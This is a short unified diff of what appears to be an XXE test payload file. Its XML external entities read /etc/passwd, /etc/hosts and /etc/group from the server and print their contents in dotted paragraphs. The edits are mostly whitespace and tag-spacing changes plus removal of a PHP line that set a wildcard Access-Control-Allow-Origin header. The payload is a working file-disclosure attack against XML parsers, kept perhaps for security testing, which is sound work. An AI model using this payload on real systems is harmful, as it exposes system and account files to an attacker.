@@ -4,24 +4,22 @@
 <!ENTITY hosts SYSTEM "file:///etc/hosts">
 <!ENTITY group SYSTEM "file://localhost/etc/group">
 
-]> 
+]>
 
 <p>
 
 
-  <p style="border-style: dotted;">/etc/passwd: 
+  <p style="border-style: dotted;">/etc/passwd:
 
 &passwd;
-  </p>
+  </p >
  <p style="border-style: dotted;">/etc/hosts:
 
 &hosts;
-  </p>
+  </p >
  <p style="border-style: dotted;">/etc/group:
 
 &group;
-  </p>
+  </p >
 
-</p>
-
-<?php header("Access-Control-Allow-Origin: *");?>
+</p >
